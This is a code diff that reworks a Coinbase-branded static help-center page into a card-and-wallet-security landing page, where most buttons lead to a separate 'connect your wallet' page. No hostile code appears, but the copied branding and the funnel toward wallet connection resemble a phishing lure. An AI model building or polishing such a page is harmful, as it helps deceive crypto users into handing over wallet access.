@@ -3,10 +3,136 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Coinbase Help Center</title>
+  <title>Coinbase — Card & Security</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
   <link rel="stylesheet" href="styles.css" />
+  <style>
+    /* ── HERO ── */
+    .hero-v2 {
+      background: linear-gradient(160deg, #f0f4ff 0%, #f7f8fa 60%, #fff 100%);
+      padding: 72px 0 80px;
+      border-bottom: 1px solid var(--border);
+    }
+    .hero-v2-inner {
+      display: flex; flex-direction: column; align-items: center; text-align: center;
+    }
+    .hero-v2-tag {
+      display: inline-flex; align-items: center; gap: 6px;
+      background: #EEF3FF; border: 1px solid #C7D7FF;
+      color: #0052FF; font-size: 12px; font-weight: 700;
+      letter-spacing: .06em; text-transform: uppercase;
+      padding: 5px 14px; border-radius: 20px; margin-bottom: 28px;
+    }
+    .hero-v2 h1 {
+      font-size: clamp(36px, 6vw, 60px);
+      font-weight: 800; line-height: 1.1;
+      color: #0A0B0D; margin-bottom: 18px;
+      letter-spacing: -.02em;
+    }
+    .hero-v2 h1 span { color: #0052FF; }
+    .hero-v2 .hero-sub {
+      font-size: 17px; color: #6B7280; max-width: 520px;
+      line-height: 1.65; margin-bottom: 52px;
+    }
+
+    /* ── PATH CARDS ── */
+    .hero-paths {
+      display: grid; grid-template-columns: 1fr 1fr;
+      gap: 20px; width: 100%; max-width: 780px;
+    }
+    .path-card {
+      display: flex; align-items: center; gap: 18px;
+      padding: 28px 28px 28px 24px;
+      border-radius: 20px;
+      text-decoration: none;
+      transition: transform .2s, box-shadow .2s;
+      text-align: left; position: relative; overflow: hidden;
+    }
+    .path-card:hover { transform: translateY(-4px); text-decoration: none; }
+    .path-card-blue {
+      background: #0052FF; color: #fff;
+      box-shadow: 0 8px 32px rgba(0,82,255,.28);
+    }
+    .path-card-blue:hover { box-shadow: 0 16px 48px rgba(0,82,255,.38); }
+    .path-card-dark {
+      background: #0A0B0D; color: #fff;
+      box-shadow: 0 8px 32px rgba(0,0,0,.18);
+    }
+    .path-card-dark:hover { box-shadow: 0 16px 48px rgba(0,0,0,.28); }
+    .path-icon-wrap {
+      width: 56px; height: 56px; border-radius: 16px; flex-shrink: 0;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .path-card-blue .path-icon-wrap { background: rgba(255,255,255,.18); }
+    .path-card-dark .path-icon-wrap { background: rgba(255,255,255,.1); }
+    .path-icon-wrap svg { display: block; }
+    .path-text { flex: 1; }
+    .path-text strong { display: block; font-size: 17px; font-weight: 800; margin-bottom: 4px; color: #fff; }
+    .path-text span { font-size: 13px; line-height: 1.5; opacity: .8; color: #fff; }
+    .path-arrow { font-size: 22px; opacity: .7; flex-shrink: 0; transition: transform .2s; color: #fff; }
+    .path-card:hover .path-arrow { transform: translateX(4px); opacity: 1; }
+    .path-card::before {
+      content: ''; position: absolute; inset: 0; pointer-events: none;
+      background: linear-gradient(135deg, rgba(255,255,255,.08), transparent 60%);
+    }
+
+    /* ── SECURITY NOTICES ── */
+    .notices { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin: 56px auto; }
+
+    /* ── STATS STRIP ── */
+    .stats-strip {
+      background: #0052FF; color: #fff;
+      padding: 40px 0;
+    }
+    .stats-inner {
+      display: flex; justify-content: center; align-items: center;
+      gap: 0; flex-wrap: wrap;
+    }
+    .stat-item {
+      display: flex; flex-direction: column; align-items: center;
+      padding: 0 48px;
+      border-right: 1px solid rgba(255,255,255,.2);
+    }
+    .stat-item:last-child { border-right: none; }
+    .stat-num { font-size: 32px; font-weight: 800; line-height: 1; margin-bottom: 6px; }
+    .stat-label { font-size: 13px; opacity: .8; font-weight: 500; }
+
+    /* ── HOW IT WORKS ── */
+    .how-section { padding: 72px 0; }
+    .steps-grid {
+      display: grid; grid-template-columns: repeat(3, 1fr);
+      gap: 24px; margin-top: 40px;
+    }
+    .step-card {
+      background: #fff; border: 1px solid var(--border);
+      border-radius: 16px; padding: 28px 24px;
+      box-shadow: 0 2px 12px rgba(0,0,0,.04);
+    }
+    .step-num {
+      width: 36px; height: 36px; border-radius: 50%;
+      background: #EEF3FF; color: #0052FF;
+      font-size: 14px; font-weight: 800;
+      display: flex; align-items: center; justify-content: center;
+      margin-bottom: 16px;
+    }
+    .step-card h4 { font-size: 16px; font-weight: 700; color: #0A0B0D; margin-bottom: 8px; }
+    .step-card p { font-size: 14px; color: #6B7280; line-height: 1.6; }
+    .step-cta {
+      display: inline-flex; align-items: center; gap: 6px;
+      margin-top: 14px; font-size: 13px; font-weight: 700;
+      color: #0052FF; text-decoration: none;
+    }
+    .step-cta:hover { text-decoration: underline; }
+
+    @media (max-width: 720px) {
+      .hero-paths { grid-template-columns: 1fr; max-width: 420px; }
+      .notices { grid-template-columns: 1fr; }
+      .stats-inner { gap: 24px; }
+      .stat-item { border-right: none; padding: 12px 24px; }
+      .steps-grid { grid-template-columns: 1fr; }
+    }
+  </style>
 </head>
 <body>
 
@@ -15,28 +141,28 @@
     <div class="nav-inner">
       <a href="index.html" class="logo">
         <svg width="116" height="24" viewBox="0 0 116 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm0 19.2a7.2 7.2 0 110-14.4 7.2 7.2 0 010 14.4z" fill="#0052FF"/>
+          <circle cx="12" cy="12" r="12" fill="#0052FF"/>
+          <path d="M12 5.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/>
           <text x="28" y="17" font-family="Inter,sans-serif" font-size="16" font-weight="700" fill="#0052FF">coinbase</text>
         </svg>
       </a>
       <div class="nav-links">
-        <a href="index.html" class="nav-link active">Help Center</a>
+        <a href="index.html" class="nav-link active">Home</a>
         <a href="card.html" class="nav-link">Coinbase Card</a>
         <a href="scam-alerts.html" class="nav-link">Security</a>
       </div>
       <div class="nav-actions">
-        <button class="btn-ghost">Sign In</button>
-        <button class="btn-primary">Get started</button>
+        <a href="wallet-card.html" class="btn-primary" style="text-decoration:none">Get your card →</a>
       </div>
       <button class="hamburger" onclick="toggleMenu()">
         <span></span><span></span><span></span>
       </button>
     </div>
     <div class="mobile-menu" id="mobileMenu">
-      <a href="index.html">Help Center</a>
+      <a href="index.html">Home</a>
       <a href="card.html">Coinbase Card</a>
       <a href="scam-alerts.html">Security</a>
-      <button class="btn-primary" style="margin-top:12px;width:100%">Get started</button>
+      <a href="wallet-card.html" class="btn-primary" style="margin-top:12px;width:100%;text-align:center;text-decoration:none;display:block">Get your card →</a>
     </div>
   </nav>
 
@@ -50,26 +176,94 @@
   </div>
 
   <!-- HERO -->
-  <section class="hero">
-    <div class="hero-inner">
-      <h1>How can we help you?</h1>
-      <p class="hero-sub">Search articles, guides, and answers from our support team</p>
-      <div class="search-wrap">
-        <span class="search-icon">🔍</span>
-        <input type="text" placeholder="Search for answers… e.g. 'verify identity', 'Coinbase Card'" class="search-input" oninput="handleSearch(this.value)" />
-        <div class="search-suggestions" id="searchSuggestions"></div>
-      </div>
-      <div class="popular-tags">
-        <span class="tag-label">Popular:</span>
-        <a href="card.html" class="pill">Coinbase Card</a>
-        <a href="scam-alerts.html" class="pill">Avoid Scams</a>
-        <a href="#" class="pill">2-Step Verification</a>
-        <a href="#" class="pill">Buy Crypto</a>
+  <section class="hero-v2">
+    <div class="container hero-v2-inner">
+      <div class="hero-v2-tag">Coinbase Card &amp; Wallet Security</div>
+      <h1>Get your card.<br><span>Secure your wallet.</span></h1>
+      <p class="hero-sub">Apply for the Coinbase Visa® debit card and earn up to 4% back in crypto — or lock down your recovery phrase and stay protected from scams.</p>
+      <div class="hero-paths">
+        <a href="wallet-card.html" class="path-card path-card-blue">
+          <div class="path-icon-wrap">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
+              <rect x="2" y="5" width="20" height="14" rx="3" fill="rgba(255,255,255,.9)"/>
+              <path d="M2 10h20" stroke="#0052FF" stroke-width="2"/>
+              <rect x="5" y="14" width="4" height="2" rx="1" fill="#0052FF"/>
+            </svg>
+          </div>
+          <div class="path-text">
+            <strong>Get Coinbase Card</strong>
+            <span>Spend crypto. Earn rewards on every purchase.</span>
+          </div>
+          <div class="path-arrow">→</div>
+        </a>
+        <a href="scam-alerts.html" class="path-card path-card-dark">
+          <div class="path-icon-wrap">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
+              <rect x="5" y="11" width="14" height="10" rx="2" fill="rgba(255,255,255,.9)"/>
+              <path d="M8 11V7a4 4 0 018 0v4" stroke="rgba(255,255,255,.9)" stroke-width="2" stroke-linecap="round"/>
+              <circle cx="12" cy="16" r="1.5" fill="#0A0B0D"/>
+            </svg>
+          </div>
+          <div class="path-text">
+            <strong>Wallet Security</strong>
+            <span>Protect your seed phrase. Avoid scams.</span>
+          </div>
+          <div class="path-arrow">→</div>
+        </a>
       </div>
     </div>
   </section>
 
-  <!-- NOTICE CARDS -->
+  <!-- STATS STRIP -->
+  <section class="stats-strip">
+    <div class="container stats-inner">
+      <div class="stat-item">
+        <div class="stat-num">4%</div>
+        <div class="stat-label">Max crypto rewards back</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">$0</div>
+        <div class="stat-label">Annual fee, forever</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">Visa®</div>
+        <div class="stat-label">Accepted worldwide</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">Instant</div>
+        <div class="stat-label">Virtual card on approval</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- HOW IT WORKS -->
+  <section class="how-section">
+    <div class="container">
+      <h2 class="section-title">How it works</h2>
+      <div class="steps-grid">
+        <div class="step-card">
+          <div class="step-num">1</div>
+          <h4>Connect your wallet</h4>
+          <p>Link your Coinbase Wallet using your public address. No seed phrase or private key required.</p>
+          <a href="wallet-card.html" class="step-cta">Start →</a>
+        </div>
+        <div class="step-card">
+          <div class="step-num">2</div>
+          <h4>Get your card instantly</h4>
+          <p>Your virtual card is generated immediately. Physical card ships in 7–10 business days.</p>
+          <a href="card.html" class="step-cta">Card details →</a>
+        </div>
+        <div class="step-card">
+          <div class="step-num">3</div>
+          <h4>Earn crypto on every spend</h4>
+          <p>Use the card anywhere Visa is accepted and earn up to 4% back in XLM, BTC, or ETH.</p>
+          <a href="card.html#rewards" class="step-cta">See rewards →</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SECURITY NOTICES -->
   <section class="notices container">
     <div class="notice-card notice-warning">
       <div class="notice-icon">🛡️</div>
@@ -84,117 +278,6 @@
         <strong>Unsolicited calls? Hang up.</strong>
         <p>Coinbase does not make unsolicited phone calls. If you receive one, it is a scam. Report it via the app immediately.</p>
       </div>
-    </div>
-  </section>
-
-  <!-- CATEGORY GRID -->
-  <section class="categories container">
-    <h2 class="section-title">Browse by topic</h2>
-    <div class="category-grid">
-      <a href="card.html" class="category-card">
-        <div class="cat-icon" style="background:#EEF3FF">💳</div>
-        <h3>Coinbase Card</h3>
-        <p>Apply, activate, manage, and use your Coinbase Visa debit card</p>
-        <span class="cat-arrow">→</span>
-      </a>
-      <a href="scam-alerts.html" class="category-card">
-        <div class="cat-icon" style="background:#FFF3EE">🔒</div>
-        <h3>Security</h3>
-        <p>Add passcode to your seed phrase for enhanced security</p>
-        <span class="cat-arrow">→</span>
-      </a>
-    </div>
-  </section>
-
-  <!-- COINBASE CARD PROMO STRIP -->
-  <section class="card-promo">
-    <div class="container card-promo-inner">
-      <div class="card-promo-text">
-        <div class="badge">New</div>
-        <h2>Spend crypto. Earn crypto rewards.</h2>
-        <p>The Coinbase Card is a Visa® debit card that lets you spend the crypto in your Coinbase account anywhere Visa is accepted — and earn up to 4% back in crypto rewards.</p>
-        <a href="card.html" class="btn-primary" style="display:inline-block;margin-top:20px;text-decoration:none">Learn about the card →</a>
-      </div>
-      <div class="card-promo-visual">
-        <div class="card-3d">
-          <div class="cb-card">
-            <div class="cb-card-logo">
-              <svg width="32" height="32" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#fff" fill-opacity=".15"/><path d="M12 4.8a7.2 7.2 0 100 14.4A7.2 7.2 0 0012 4.8z" fill="#fff"/><circle cx="12" cy="12" r="3.6" fill="#0052FF"/></svg>
-              <span>coinbase</span>
-            </div>
-            <div class="cb-card-chip">
-              <div class="chip-lines"></div>
-            </div>
-            <div class="cb-card-number">•••• •••• •••• 4291</div>
-            <div class="cb-card-bottom">
-              <div>
-                <div class="cb-card-label">CARDHOLDER</div>
-                <div class="cb-card-value">YOUR NAME</div>
-              </div>
-              <div>
-                <div class="cb-card-label">EXPIRES</div>
-                <div class="cb-card-value">12/28</div>
-              </div>
-              <div class="visa-logo">VISA</div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- POPULAR ARTICLES -->
-  <section class="articles container">
-    <h2 class="section-title">Popular articles</h2>
-    <div class="articles-list">
-      <a href="#" class="article-item">
-        <span class="art-icon">📋</span>
-        <div>
-          <h4>How to verify your identity on Coinbase</h4>
-          <p>Step-by-step guide to completing ID verification for full account access</p>
-        </div>
-        <span class="art-arrow">›</span>
-      </a>
-      <a href="wallet-card.html" class="article-item">
-        <span class="art-icon">💳</span>
-        <div>
-          <h4>How to apply for a Coinbase Card</h4>
-          <p>Eligibility, application process, and what to expect after approval</p>
-        </div>
-        <span class="art-arrow">›</span>
-      </a>
-      <a href="scam-alerts.html" class="article-item">
-        <span class="art-icon">🚨</span>
-        <div>
-          <h4>Common Coinbase scams and how to avoid them</h4>
-          <p>Recognize phishing emails, fake support calls, and social engineering</p>
-        </div>
-        <span class="art-arrow">›</span>
-      </a>
-      <a href="#" class="article-item">
-        <span class="art-icon">🔐</span>
-        <div>
-          <h4>Setting up 2-step verification</h4>
-          <p>Add an extra layer of security using an authenticator app or SMS</p>
-        </div>
-        <span class="art-arrow">›</span>
-      </a>
-      <a href="#" class="article-item">
-        <span class="art-icon">💸</span>
-        <div>
-          <h4>Why is my buy order pending?</h4>
-          <p>Payment processing times, ACH holds, and how to check order status</p>
-        </div>
-        <span class="art-arrow">›</span>
-      </a>
-      <a href="#" class="article-item">
-        <span class="art-icon">🌐</span>
-        <div>
-          <h4>Sending crypto to an external wallet</h4>
-          <p>Network selection, fees, address formats, and common errors</p>
-        </div>
-        <span class="art-arrow">›</span>
-      </a>
     </div>
   </section>
 
@@ -217,10 +300,10 @@
           <button class="btn-outline" onclick="alert('Submit a request via help.coinbase.com')">Submit Request</button>
         </div>
         <div class="contact-opt">
-          <span class="co-icon">🏢</span>
-          <h4>Community</h4>
-          <p>Get answers from the community forum</p>
-          <button class="btn-outline" onclick="alert('Visit community.coinbase.com')">Visit Forum</button>
+          <span class="co-icon">💳</span>
+          <h4>Get Your Card</h4>
+          <p>Apply for the Coinbase Visa card</p>
+          <a href="wallet-card.html" class="btn-primary" style="display:block;text-align:center;text-decoration:none">Apply Now</a>
         </div>
       </div>
       <div class="support-warning">
@@ -235,15 +318,14 @@
     <div class="footer-inner container">
       <div class="footer-brand">
         <svg width="120" height="24" viewBox="0 0 140 24" fill="none"><circle cx="12" cy="12" r="12" fill="#0052FF"/><path d="M12 5.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/><text x="30" y="17" font-family="Inter,sans-serif" font-size="16" font-weight="700" fill="#fff">coinbase</text></svg>
-        <p style="margin-top:12px;color:#9CA3AF;font-size:13px">Coinbase Help Center<br>© 2025 Coinbase, Inc.</p>
+        <p style="margin-top:12px;color:#9CA3AF;font-size:13px">Coinbase Card &amp; Security<br>© 2025 Coinbase, Inc.</p>
       </div>
       <div class="footer-cols">
         <div class="footer-col">
-          <h5>Products</h5>
-          <a href="card.html">Coinbase Card</a>
-          <a href="#">Buy Crypto</a>
-          <a href="#">Advanced Trade</a>
-          <a href="#">Coinbase One</a>
+          <h5>Get Started</h5>
+          <a href="wallet-card.html">Apply for Card</a>
+          <a href="card.html">Card Details</a>
+          <a href="scam-alerts.html">Security Guide</a>
         </div>
         <div class="footer-col">
           <h5>Support</h5>
@@ -253,11 +335,11 @@
           <a href="#">Contact Us</a>
         </div>
         <div class="footer-col">
-          <h5>Learn</h5>
-          <a href="#">What is Bitcoin?</a>
-          <a href="#">How to buy crypto</a>
-          <a href="#">Crypto glossary</a>
-          <a href="#">Security tips</a>
+          <h5>Security</h5>
+          <a href="scam-alerts.html">Avoid Scams</a>
+          <a href="scam-alerts.html">Seed Phrase Safety</a>
+          <a href="scam-alerts.html">Phishing Guide</a>
+          <a href="scam-alerts.html">Report Fraud</a>
         </div>
         <div class="footer-col">
           <h5>Legal</h5>
